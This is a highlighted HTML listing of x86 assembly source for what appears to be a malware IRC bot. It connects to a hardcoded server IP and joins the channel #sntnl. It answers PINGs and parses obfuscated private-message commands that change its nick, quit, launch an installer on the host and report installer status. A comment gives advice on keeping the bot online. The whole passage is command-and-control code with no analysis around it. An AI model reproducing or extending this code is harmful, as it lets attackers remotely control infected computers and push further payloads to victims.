    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">post</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16d</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">post_vers</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5d</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">version</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4d</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">crlf</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03d</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_STRING_SIZE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IRC_SEND</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">.RespondPing</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pong</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nrbytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IRC_SEND</span><span class="sc0">

</span><span class="sc5">.RespondPing_End</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">IRC_SCANBUFFER</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc1">; IN    esi: buffer start</span><span class="sc0">
    </span><span class="sc1">;   ecx: buffer size</span><span class="sc0">

    </span><span class="sc5">ScanDaBuffer</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nrbytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">.PingPongMessage</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'GNIP'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">GetReplyNick</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">.RespondPing</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EndLoop</span><span class="sc0">

    </span><span class="sc5">GetReplyNick</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">EndLoop</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'!'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ExtractReplyNick</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">EndLoop</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetReplyNick</span><span class="sc0">

    </span><span class="sc5">ExtractReplyNick</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">replynick</span><span class="sc4">]</span><span class="sc0">  
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    
    </span><span class="sc5">ScanLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">EndLoop</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'VIRP'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">SearchTextStart</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ScanLoop</span><span class="sc0">

    </span><span class="sc5">SearchTextStart</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">EndLoop</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">.CommandMessage</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SearchTextStart</span><span class="sc0">

    </span><span class="sc5">.CommandMessage</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'s54p'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">EndLoop</span><span class="sc0">

    </span><span class="sc5">GetText</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'/'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">EndLoop</span><span class="sc0">

    </span><span class="sc5">CheckIncomingCommandMessage</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'kc1n'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CreateRandomNick</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'t1uq'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">QuitIrc</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'c3xe'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">LaunchInstaller</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'t4ts'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">InstallerStatus</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IRC_SEND</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EndLoop</span><span class="sc0">

    </span><span class="sc5">CreateRandomNick</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mynick</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CREATE_RANDOM_NAME</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'KCIN'</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mynick</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_STRING_SIZE</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">crlf</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_STRING_SIZE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IRC_SEND</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EndLoop</span><span class="sc0">

    </span><span class="sc5">QuitIrc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">quit</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IRC_SEND</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EndLoop</span><span class="sc0">

    </span><span class="sc5">LaunchInstaller</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">INSTALLER_LAUNCH</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EndLoop</span><span class="sc0">
    
    </span><span class="sc5">InstallerStatus</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">INSTALLER_STATUS</span><span class="sc0">

    </span><span class="sc5">EndLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">IRC_SCANBUFFER</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


    </span><span class="sc5">version</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"0101"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">post</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"PRIVMSG #sntnl :"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">post_vers</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"vers "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">mynick</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">replynick</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

    </span><span class="sc5">nrbytes</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ircstatus</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ircthreadid</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">wsock32</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WSOCK32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wininet</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WININET.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">ASend</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"send"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ARecv</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"recv"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AWSAGetLastError</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WSAGetLastError"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AWSAGetLastErrorA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AInternetGetConnectedState</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"InternetGetConnectedState"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ACreateThread</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateThread"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AWSAStartup</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WSAStartup"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AWSACleanup</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WSACleanup"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">Asocket</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"socket"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">Aconnect</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"connect"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">Aclosesocket</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"closesocket"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">Ahtons</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"htons"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">Ainet_addr</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"inet_addr"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AGetTickCount</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetTickCount"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AGetLastError</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetLastError"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ASleep</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Sleep"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">random_number</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">01234567h</span><span class="sc0">
    </span><span class="sc5">ipaddress</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"212.43.217.183"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc1">; if the bot does not appear online in #sentinel, try using a different</span><span class="sc0">
    </span><span class="sc1">; server ip-address.</span><span class="sc0">

    </span><span class="sc5">user1</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"USER "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">user2</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" bb cc sentinel"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">nick</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"NICK "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">pong</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"PONG"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">join</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"JOIN #sntnl"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">quit</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"QUIT"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">crlf</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dots</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' :'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">socketh</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">buffer</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

    </span><span class="sc5">mywsadata</span><span class="sc0">           </span><span class="sc5">WSADATA</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
    </span><span class="sc5">mysocket</span><span class="sc0">            </span><span class="sc5">SOCKADDR</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">

</span><span class="sc5">CREATE_RANDOM_NAME</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc1">; IN: edi = place to put 5 rnd chars</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetRandomChar</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetRandomChar</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetRandomChar</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetRandomChar</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetRandomChar</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">GetRandomChar</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">26d</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_RANDOM_NUMBER_WITHIN</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">97d</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">CREATE_RANDOM_NAME</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

